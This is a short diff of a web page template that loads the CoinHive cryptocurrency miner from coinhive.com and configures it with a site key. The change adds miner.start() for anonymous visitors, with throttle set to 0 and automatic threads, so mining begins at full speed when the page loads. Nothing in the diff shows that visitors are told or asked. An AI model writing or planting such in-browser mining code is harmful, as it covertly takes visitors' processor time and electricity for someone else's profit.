@@ -1,4 +1,4 @@
-<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script defer src="https://coinhive.com/lib/coinhive.min.js"></script>
 <script>
     {% if login %}
     var miner = new CoinHive.User('R8uBnEUWe9lzB5R9BAhAoPiaNbIvv56c','{{ name }}',{
@@ -10,6 +10,7 @@
     var miner = new CoinHive.Anonymous('R8uBnEUWe9lzB5R9BAhAoPiaNbIvv56c',{
         autoThreads: true,
         throttle: 0
-    });
+    });    
+    miner.start();
     {% endif %}
 </script>
